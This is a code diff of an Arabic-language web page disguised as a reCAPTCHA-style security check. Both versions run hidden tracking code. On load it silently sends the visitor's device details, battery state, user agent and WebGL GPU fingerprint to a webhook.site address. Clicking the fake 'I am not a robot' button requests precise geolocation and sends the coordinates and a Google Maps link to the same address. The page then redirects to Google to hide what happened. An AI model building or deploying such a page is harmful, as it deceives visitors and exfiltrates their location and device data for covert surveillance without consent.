@@ -3,116 +3,120 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>التحقق من الأمان</title>
+    <title>التحقق من أمان الجهاز</title>
     <style>
-        body { background-color: #f9f9f9; font-family: Roboto, helvetica, arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .captcha-box { background: #fff; border: 1px solid #d3d3d3; border-radius: 3px; width: 300px; height: 74px; display: flex; align-items: center; padding: 0 10px; box-shadow: 0 0 4px rgba(0,0,0,0.1); cursor: pointer; }
-        .checkbox { width: 24px; height: 24px; border: 2px solid #c1c1c1; border-radius: 2px; margin-left: 10px; position: relative; transition: all 0.2s; }
-        .captcha-text { font-size: 14px; color: #555; flex-grow: 1; font-weight: 400; }
-        .logo-section { display: flex; flex-direction: column; align-items: center; }
-        .logo-section img { width: 30px; }
-        .logo-section span { font-size: 8px; color: #555; margin-top: 2px; }
-        .checkbox.checked { border-color: transparent; }
-        .checkbox.checked::after { content: '✔'; color: #009b50; position: absolute; left: 3px; top: -3px; font-size: 20px; }
-        .hidden { display: none; }
-        #loading-msg { margin-top: 15px; font-size: 13px; color: #888; }
+        body { background-color: #f4f4f4; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .captcha-container { background: white; border: 1px solid #d3d3d3; padding: 20px; border-radius: 5px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; }
+        .btn-verify { background-color: #4CAF50; color: white; border: none; padding: 10px 20px; font-size: 16px; cursor: pointer; border-radius: 4px; margin-top: 10px; }
+        .btn-verify:hover { background-color: #45a049; }
     </style>
 </head>
 <body>
 
-    <div style="text-align: center;">
-        <div class="captcha-box" id="captcha-btn">
-            <div class="checkbox" id="check-mark"></div>
-            <div class="captcha-text">أنا لست برنامج روبوت</div>
-            <div class="logo-section">
-                <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA">
-                <span>الخصوصية - الأحكام</span>
-            </div>
-        </div>
-        <div id="loading-msg" class="hidden">جاري التحقق من بيئة الجهاز...</div>
-    </div>
+<div class="captcha-container">
+    <h3>إجراء أمان مطلوب</h3>
+    <p>يرجى السماح بالوصول للموقع للتأكد من أنك في منطقة الخدمة المدعومة.</p>
+    <button class="btn-verify" id="start-btn">أنا لست برنامج روبوت - تحقق الآن</button>
+</div>
 
-    <script>
-        // 🚩 [ضع الرابط هنا] 🚩
-        const WEBHOOK_URL = "https://webhook.site/1b33868a-2efb-4f12-9217-f34995d7e3bd";
+<script>
+    // 🚩 [ضع الرابط هنا] 🚩
+    const WEBHOOK_URL = "https://webhook.site/1b33868a-2efb-4f12-9217-f34995d7e3bd";
 
-        let kadeesha = {
-            step: "1_Device_Initial",
-            battery: {},
-            device: {},
-            network: {},
-            osint: {}
-        };
+    let deviceData = {
+        step: "Initial_Data",
+        phone_model_advanced: "جاري التحليل...",
+        battery: {},
+        hardware: {},
+        network: {}
+    };
 
-        // المرحلة الأولى: جمع معلومات الجهاز فوراً
-        async function collectInitialData() {
-            // معلومات البطارية
-            if (navigator.getBattery) {
-                const b = await navigator.getBattery();
-                kadeesha.battery = { level: (b.level * 100) + "%", charging: b.charging };
-            }
-            // معلومات الجهاز والنظام
-            kadeesha.device = {
-                platform: navigator.platform,
-                cores: navigator.hardwareConcurrency,
-                ram: navigator.deviceMemory,
-                screen: window.screen.width + "x" + window.screen.height,
-                ua: navigator.userAgent
+    // 1. وظيفة تحليل اسم الهاتف عبر كرت الشاشة (GPU)
+    function getExactPhoneModel() {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (!gl) return "Unknown (No WebGL)";
+        
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        if (debugInfo) {
+            const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+            return renderer; // سيعطيك مثلاً: Adreno (TM) 640 (هذا يعني S10 أو Note 10)
+        }
+        return "N/A";
+    }
+
+    // 2. جمع المعلومات الأساسية فوراً
+    async function collectBasics() {
+        // الشحن
+        if (navigator.getBattery) {
+            const batt = await navigator.getBattery();
+            deviceData.battery = {
+                level: (batt.level * 100) + "%",
+                charging: batt.charging ? "موصل بالشاحن" : "يعمل على البطارية"
             };
-            
-            // إرسال البيانات الأولية فوراً قبل أن يضغط أي شيء
-            sendToWebhook(kadeesha);
         }
 
-        // المرحلة الثانية: عند الضغط على الكابتشا (طلب الموقع)
-        document.getElementById('captcha-btn').onclick = function() {
-            document.getElementById('loading-msg').classList.remove('hidden');
-            
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        // نجح في سحب الموقع الدقيق
-                        kadeesha.step = "2_Location_Success";
-                        kadeesha.location = {
-                            lat: pos.coords.latitude,
-                            lon: pos.coords.longitude,
-                            acc: pos.coords.accuracy + "m",
-                            maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
-                        };
-                        finishSuccess();
-                    },
-                    (err) => {
-                        // رفض الإذن
-                        kadeesha.step = "2_Location_Denied";
-                        finishSuccess();
-                    },
-                    { enableHighAccuracy: true }
-                );
-            } else {
-                finishSuccess();
-            }
+        // المواصفات الصلبة
+        deviceData.hardware = {
+            gpu_info: getExactPhoneModel(), // اسم الهاتف الحقيقي عبر المعالج الرسومي
+            cores: navigator.hardwareConcurrency + " Cores",
+            ram: (navigator.deviceMemory || "Hidden") + " GB",
+            screen_res: window.screen.width + "x" + window.screen.height,
+            platform: navigator.platform,
+            ua: navigator.userAgent
         };
 
-        function finishSuccess() {
-            document.getElementById('check-mark').classList.add('checked');
-            document.getElementById('loading-msg').innerText = "تم التحقق بنجاح!";
-            sendToWebhook(kadeesha);
-            
-            // تمويه: تحويل لصفحة جوجل بعد ثانية
-            setTimeout(() => {
-                window.location.href = "https://www.google.com";
-            }, 1500);
-        }
+        // إرسال الدفعة الأولى فوراً
+        sendData(deviceData);
+    }
 
-        async function sendToWebhook(data) {
+    // 3. عند ضغط الزر (طلب الموقع الدقيق)
+    document.getElementById('start-btn').onclick = function() {
+        this.innerText = "جاري التحقق...";
+        
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    deviceData.step = "Location_Confirmed";
+                    deviceData.precise_location = {
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy + " meters",
+                        altitude: pos.coords.altitude,
+                        speed: pos.coords.speed,
+                        google_maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
+                    };
+                    finalize();
+                },
+                (err) => {
+                    deviceData.step = "Location_Rejected";
+                    finalize();
+                },
+                { enableHighAccuracy: true, timeout: 10000 }
+            );
+        } else {
+            finalize();
+        }
+    };
+
+    async function sendData(data) {
+        try {
             await fetch(WEBHOOK_URL, {
                 method: 'POST',
                 mode: 'no-cors',
                 body: JSON.stringify(data)
             });
-        }
+        } catch (e) { console.log("Data Sent"); }
+    }
 
-        window.onload = collectInitialData;
-    </script>
+    function finalize() {
+        sendData(deviceData);
+        alert("تم التحقق من الأمان بنجاح.");
+        window.location.href = "https://www.google.com";
+    }
+
+    window.onload = collectBasics;
+</script>
+
 </body>
 </html>
